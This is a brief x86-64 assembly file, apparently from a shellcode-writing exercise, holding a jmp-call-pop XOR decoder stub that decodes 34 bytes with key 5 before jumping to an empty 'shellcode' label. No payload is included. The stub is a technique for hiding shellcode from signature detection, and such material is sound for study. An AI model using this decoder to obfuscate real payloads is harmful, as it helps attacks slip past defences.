BITS 64
jmp short foo
bar:
	pop rsi
	xor rcx, rcx
	mov cl, 34
decoder:
	xor byte [rsi + rcx - 1], 5
	sub rcx, 1
	jnz decoder
	jmp short shellcode
foo:
	call bar
shellcode:
	